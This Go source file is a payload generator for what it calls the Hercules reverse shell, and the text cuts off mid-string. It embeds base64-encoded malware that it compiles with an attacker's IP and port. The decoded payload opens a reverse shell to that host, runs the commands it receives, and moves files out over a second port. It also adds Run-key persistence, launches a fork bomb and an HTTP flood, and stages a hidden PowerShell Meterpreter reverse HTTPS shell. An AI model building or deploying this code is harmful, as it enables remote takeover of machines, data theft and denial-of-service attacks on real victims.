package main



import "strings"
import "fmt"
import "os"
import "runtime"
import "os/exec"
import "path/filepath"
import "encoding/base64"
import "github.com/fatih/color"



func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
  ARGS := os.Args[1:]

  var ARG string
  var PAYLOAD string = "Windows"
  var ARC string = "386" 
  var LINKER string = "static"

  if len(ARGS) == 0 {
    color.Yellow(HELP)
    os.Exit(1)
  }

  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
    color.Red("\n[-] ERROR : Invalid IP !")
    os.Exit(1)
  }

  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
    color.Red("\n[-] ERROR : Invalid Port !")
    os.Exit(1)
  }

  for i := 0; i < len(ARGS); i++ {
    if i == 0 {
      ARG = ARGS[i]
    }else{
      ARG = (ARG +" "+ ARGS[i])
    }
  }

  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
    ARC = "386"
  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
    ARC = "amd64"
  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
    color.Red("\n[-] ERROR : Invalid Architecture !")
    os.Exit(1)
  }

 if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
  LINKER =  "static"
 }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
  LINKER = "dynamic"
 }else if strings.Contains(ARG, "-l") {
  color.Red("\n[-] ERROR : Invalid Linker !")
  os.Exit(1)
 }




  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Windows"
  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(LINUX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Linux"
  }else if strings.Contains(ARG, "-p osx") || strings.Contains(ARG, "-P OSX") || strings.Contains(ARG, "-p OSX") || strings.Contains(ARG, "-P osx") {
    OSX_PAYLOAD, _ := base64.StdEncoding.DecodeString(OSX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(OSX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "OSX"
  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
    color.Red("\n[-] ERROR : Invalid Payload !")
    os.Exit(1)
  }else {
  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
  }


  color.Blue("\n\n[*] Payload : "+PAYLOAD)
  color.Blue("\n[*] Architecture : "+ARC)
  color.Blue("\n[*] Linker : "+LINKER)
  color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir)) 
}


func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string) {

  IP = string("\""+IP+"\";")
  PORT = string("\""+PORT+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
  Index = strings.Replace(Index, "\"8552\";", PORT, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    if LINKER == "static" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
    }


    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    } 
    Builder.WriteString(LINKER)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    if LINKER == "static" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }

    exec.Command("sh", "-c", LINKER).Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}





var WINDOWS_PAYLOAD string = `CnBhY2thZ2UgbWFpbjsKCmltcG9ydCAibmV0IjsKaW1wb3J0ICJvcy9leGVjIjsKaW1wb3J0ICJidWZpbyI7CmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJpbyI7CmltcG9ydCAiYnl0ZXMiCmltcG9ydCAiY29tcHJlc3MvZmxhdGUiCmltcG9ydCAiZW5jb2RpbmcvYmFzZTY0IgoKCgpjb25zdCBJUCBzdHJpbmcgPSAiMTI3LjAuMC4xIjsKY29uc3QgUE9SVCBzdHJpbmcgPSAiODU1MiI7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCnZhciBHTE9CQUxfQ09NTUFORCBzdHJpbmc7CnZhciBET1NfVGFyZ2V0IHN0cmluZzsKdmFyIERPU19SZXF1ZXN0X0NvdW50ZXIgaW50ID0gMDsKdmFyIERPU19SZXF1ZXN0X0xpbWl0IGludCA9IDEwMDA7Cgp2YXIgSVBfUE9SVCBzdHJpbmc7CgpmdW5jIG1haW4oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrUE9SVCk7ICAgICAgICAgICAgICAgICAgICAgICAKICBpZiBlcnIgIT0gbmlsIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcChUSU1FX0RFTEFZKnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgbWFpbigpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIH07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIAogIGRpciwgXyA6PSBmaWxlcGF0aC5BYnMoZmlsZXBhdGguRGlyKG9zLkFyZ3NbMF0pKTsgICAgIAogIFZlcnNpb25fQ2hlY2sgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAidmVyIik7CiAgVmVyc2lvbl9DaGVjay5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIHZlcnNpb24sIF8gOj0gVmVyc2lvbl9DaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogIFN5c0d1aWRlIDo9IChCQU5ORVIrc3RyaW5nKHZlcnNpb24pICsgIlxuXG4iICsgc3RyaW5nKGRpcikgKyAiPiIpOyAgICAgIAogIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhTeXNHdWlkZSkpKTsgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICAKICBmb3IgewogICAgCiAgICBDb21tYW5kLCBfIDo9IGJ1ZmlvLk5ld1JlYWRlcihjb25uZWN0KS5SZWFkU3RyaW5nKCdcbicpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgICBfQ29tbWFuZCA6PSBzdHJpbmcoQ29tbWFuZCk7ICAgICAgICAgICAgICAgICAgICAgIAogICAgR0xPQkFMX0NPTU1BTkQgPSBfQ29tbWFuZDsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgCgogICAgCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UExFQVNFIikgeyAKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoU0FZX1BMRUFTRSgpKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRvd25sb2FkIC1mIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ET1dOTE9BRCAtRiAiKSB7CiAgICAgIGdvIERPV05MT0FEKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblsqXSBTZW5kaW5nIGZpbGUgdG8gLT4gIitJUCsiOjU1ODg4XG5cbiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnVwbG9hZCAtZiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+VVBMT0FEIC1GICIpIHsKICAgICAgZ28gVVBMT0FEKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblsqXSBSZWNlaXZpbmcgZmlsZSBmcm9tIC0+ICIrSVArIjo1NTg4OFxuXG4iKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifk1FVEVSUFJFVEVSIC1BIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5tZXRlcnByZXRlciAtYSIpIHsKICAgICAgVGVtcF9JUF9QT1JUIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICJcIiIpCiAgICAgIElQX1BPUlQgPSBzdHJpbmcoVGVtcF9JUF9QT1JUWzFdKQogICAgICBNRVRFUlBSRVRFUl9DUkVBVEUoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gTWV0ZXJwcmV0ZXIgRXhlY3V0ZWQgIVxuXG4iK2RpcisiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ET1MiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRvcyIpIHsKICAgICAgRE9TX0NvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIikKICAgICAgRE9TX1RhcmdldCA9ICBET1NfQ29tbWFuZFsxXQogICAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhET1NfVGFyZ2V0KSwgImh0dHAiKSB7CiAgICAgICAgZ28gRE9TKCk7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gU3RhcnRpbmcgRE9TIGF0YWNrLi4uIisiXG5cblsqXSBTZW5kaW5nIDEwMDAgcmVxdWVzdCB0byAiK0RPU19UYXJnZXQrIiAhXG5cbiIrZGlyKyI+IikpOwogICAgICB9ZWxzZXsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblstXSBFUlJPUjogSW52YWxpZCB1cmwgIVxuXG4iK2RpcisiPiIpKTsKICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RElTVFJBQ1QiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRpc3RyYWN0IikgeyAKICAgICAgRElTVFJBQ1QoKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5IRUxQIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5oZWxwIikgeyAKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKEhFTFArZGlyKyI+IikpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBlcnNpc3RlbmNlIikgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgZ28gUEVSU0lTVCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBBZGRpbmcgcGVyc2lzdGVuY2UgcmVnaXN0cmllcy4uLlxuWypdIFBlcnNpc3RlbmNlIENvbXBsZXRlZFxuXG4iK2RpcisiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlewogICAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBfQ29tbWFuZCk7CiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogICAgICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoIlxuXG4iK3N0cmluZyhvdXQpKyJcbiIrc3RyaW5nKGRpcikrIj4iKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsKICAgIH07CiAgfTsKfTsKCgoKCgpmdW5jIFBFUlNJU1QoKSB7CiAgUEVSU0lTVCwgXyA6PSBvcy5DcmVhdGUoIlBFUlNJU1QuYmF0IikKCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygibWtkaXIgJUFQUERBVEElXFxXaW5kb3dzIisiXG4iKQogIFBFUlNJU1QuV3JpdGVTdHJpbmcoImNvcHkgIiArIG9zLkFyZ3NbMF0gKyAiICVBUFBEQVRBJVxcV2luZG93c1xcd2luZGxsLmV4ZVxuIikKICBQRVJTSVNULldyaXRlU3RyaW5nKCJSRUcgQUREIEhLQ1VcXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4gL1YgV2luRGxsIC90IFJFR19TWiAvRiAvRCAlQVBQREFUQSVcXFdpbmRvd3NcXHdpbmRsbC5leGUiKQoKICBQRVJTSVNULkNsb3NlKCkKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJQRVJTSVNULmJhdCIpOwogIEV4ZWMuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFeGVjLlJ1bigpOwogIENsZWFuIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgImRlbCBQRVJTSVNULmJhdCIpOwogIENsZWFuLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgQ2xlYW4uUnVuKCk7Cgp9OwoKCgpmdW5jIFVQTE9BRCgpIHsKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IisiNTU4ODgiKTsKICBpZiBlcnIgIT0gbmlsIHsKICAgIFVQTE9BRCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOwogIGZpbGUsIF8gOj0gb3MuQ3JlYXRlKGZpbGVfbmFtZVsxXSk7CiAgZmlsZV9uYW1lWzFdID0gc3RyaW5ncy5UcmltKGZpbGVfbmFtZVsxXSwgIiAiKTsKICBkZWZlciBmaWxlLkNsb3NlKCk7CiAgaW8uQ29weShmaWxlLCBjb25uZWN0KTsKICBmaWxlLkNsb3NlKCk7CiAgY29ubmVjdC5DbG9zZSgpOwp9OwoKCmZ1bmMgRE9XTkxPQUQoKSB7CiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrIjU1ODg4Iik7CiAgaWYgZXJyICE9IG5pbCB7CiAgICBET1dOTE9BRCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOwogIGZpbGUsIF8gOj0gb3MuQ3JlYXRlKGZpbGVfbmFtZVsxXSk7CiAgZmlsZV9uYW1lWzFdID0gc3RyaW5ncy5UcmltKGZpbGVfbmFtZVsxXSwgIiAiKTsKICBkZWZlciBmaWxlLkNsb3NlKCk7CiAgaW8uQ29weShmaWxlLCBjb25uZWN0KTsKICBmaWxlLkNsb3NlKCk7CiAgY29ubmVjdC5DbG9zZSgpOwp9OwoKCgoKZnVuYyBTQVlfUExFQVNFKCkgKHN0cmluZyl7CiAgQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKTsKICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBzdHJpbmcoInBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIFN0YXJ0LVByb2Nlc3MgLVZlcmIgUnVuQXMgIitzdHJpbmcoQ29tbWFuZFsxXSkpKTsKICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZyhzdHJpbmcob3V0KSk7CiAgcmV0dXJuIENvbW1hbmRfT3V0cHV0Owp9OwoKCgoKZnVuYyBESVNUUkFDVCgpIHsKICB2YXIgRm9ya19Cb21iIHN0cmluZyA9ICI6QVxuc3RhcnRcbmdvdG8gQSIKICBGX0JvbWIsIF8gOj0gb3MuQ3JlYXRlKCJGX0JvbWIuYmF0IikKCiAgRl9Cb21iLldyaXRlU3RyaW5nKEZvcmtfQm9tYikKCiAgRl9Cb21iLkNsb3NlKCkKCiAgZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiRl9Cb21iLmJhdCIpLlN0YXJ0KCkKCn0KCgpmdW5jIERPUygpIHsKICBmb3IgewogICAgRE9TX1JlcXVlc3RfQ291bnRlcisrCiAgICByZXNwb25zZSwgZXJyIDo9IGh0dHAuR2V0KERPU19UYXJnZXQpOwogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgIGJyZWFrOwogICAgfQogICAgcmVzcG9uc2UuQm9keS5DbG9zZSgpOwogICAgaWYgRE9TX1JlcXVlc3RfQ291bnRlciA8IERPU19SZXF1ZXN0X0xpbWl0IHsKICAgICAgZ28gRE9TKCkKICAgIH1lbHNlewogICAgICBicmVhazsKICAgIH0gCiAgfQp9CgoKCmZ1bmMgTUVURVJQUkVURVJfQ1JFQVRFKCkgewoKICB2YXIgQnVmZmVyIGJ5dGVzLkJ1ZmZlcgogIHZhciBQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMgc3RyaW5nID0gUkVWRVJTRV9IVFRQU19TSEVMTChzdHJpbmcoSVBfUE9SVCkpCgogIEZsYXRlLCBfIDo9IGZsYXRlLk5ld1dyaXRlcigmQnVmZmVyLDYpCiAgaWYgXywgZXJyIDo9IEZsYXRlLldyaXRlKFtdYnl0ZShQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMpKTsgZXJyICE9IG5pbCB7CiAgICBwYW5pYyhlcnIpCiAgfQogIGlmIGVyciA6PSBGbGF0ZS5GbHVzaCgpOyBlcnIgIT0gbmlsIHsKICAgIHBhbmljKGVycikKICB9CiAgaWYgZXJyIDo9IEZsYXRlLkNsb3NlKCk7IGVyciAhPSBuaWwgewogICAgcGFuaWMoZXJyKQogIH0KCiAgQnVmZmVyU3RyaW5nIDo9IEJ1ZmZlci5CeXRlcygpCiAgRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkVuY29kZVRvU3RyaW5nKFtdYnl0ZShCdWZmZXJTdHJpbmcpKQoKCiAgdmFyIFBTX01ldGVycHJldGVyIHN0cmluZyA9IENSRUFURV9QU19NRVRFUlBSRVRFUihFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcikKCiAgRmlsZSwgXyA6PSBvcy5DcmVhdGUoIldpbmRsbC5iYXQiKQogIEZpbGUuV3JpdGVTdHJpbmcoUFNfTWV0ZXJwcmV0ZXIpCgogIEZpbGUuQ2xvc2UoKTsKCiAgVGVtcENvbW1hbmQgOj0gc3RyaW5nKCJtb3ZlIHdpbmRsbC5iYXQgJSIrIkFQUERBVEEiKyIlIikKCiAgTW92ZSA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIFRlbXBDb21tYW5kKTsKICBNb3ZlLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgTW92ZS5SdW4oKTsKCiAgVGVtcENvbW1hbmRfMiA6PSBzdHJpbmcoIiUiKyJBUFBEQVRBIisiJSIrIlxcd2luZGxsLmJhdCIpCgogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBUZW1wQ29tbWFuZF8yKTsKICBFeGVjLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRXhlYy5TdGFydCgpOwoKfQoKCnZhciBCQU5ORVIgc3RyaW5nID0gYAogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcIAogICAgICAgICAgICAgICAvIF9fICAvIC9fX18vIF8sIF8vIC9fX18vIC9fLyAvIC9fX18vIC9fX18gX19fLyAvIAogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8gIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSEVSQ1VMRVMgUkVWRVJTRSBTSEVMTCAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmAKCgoKCnZhciBIRUxQIHN0cmluZyA9IGAKCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fCiAgICAgICAgICAgICAgICAgLyAvIC8gLyBfX19fLyBfXyBcLyBfX19fLyAvIC8gLyAvICAgLyBfX19fLyBfX18vCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwgCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8gCiAgICAgICAgICAgICAgL18vIC9fL19fX19fL18vIHxffFxfX19fL1xfX19fL19fX19fL19fX19fLy9fX19fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgoKflBFUlNTSVNURU5DRSAgICAgICAgICAgICAgICAgICAgIEluc3RhbGxzIGEgcGVyc2lzdGVuY2UgbW9kdWxlCgp+RElTVFJBQ1QgICAgICAgICAgICAgICAgICAgICAgICAgRXhlY3V0ZXMgYSBmb3JrIGJvbWIgYmF0IGZpbGUgZm9yIGRpc3RyYWN0aW9uICAgCgp+UExFQVNFICAgICAgICAgICAgICAgICAgICAgICAgICAgQXNrcyB1c2VycyBjb21maXJtYXRpb24gZm9yIGhpZ2hlciBwcml2aWxpZGdlIG9wZXJhdGlvbnMKCn5ET1MgLUEgInd3dy50YXJnZXRzaXRlLmNvbSIgICAgICBTdGFydHMgYSBkZW5pYWwgb2Ygc2VydmljZSBhdGFjawoKfk1FVEVSUFJFVEVSIC1BICIxMjcuMC4wLjE6ODg4OCIgIENyZWF0ZXMgYSByZXZlcnNlIGh0dHBzIG1ldGVycHJldGVyIGNvbm5lY3Rpb24gdG8gbWV0YXNwbG9pdAoKfkRPV05MT0FEIC1GICJmaWxlbmFtZS5leGUiICAgICAgIFNlbmRzIHRoZSBzZWxlY3RlZCBmaWxlIHRvIHlvdXIgaXAgdGhydSA1NTg4OCBwb3J0Cgp+VVBMT0FEIC1GICJmaWxlbmFtZS5leGUiICAgICAgICAgUmVtb3RlIG1hY2hpbmUgc3RhcnRzIGxpc3RlbmluZyBmb3IgZmlsZSBhdCA1NTg4OCBwb3J0CgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpgCgoKCgpmdW5jIENSRUFURV9QU19NRVRFUlBSRVRFUihFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlciBzdHJpbmcpIChzdHJpbmcpIHsKICAKCgp2YXIgU2hlbGxfVGVtcGxhdGUgc3RyaW5nID0gYEBlY2hvIG9mZgppZiAlUFJPQ0VTU09SX0FSQ0hJVEVDVFVSRSU9PXg4NiAocG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21w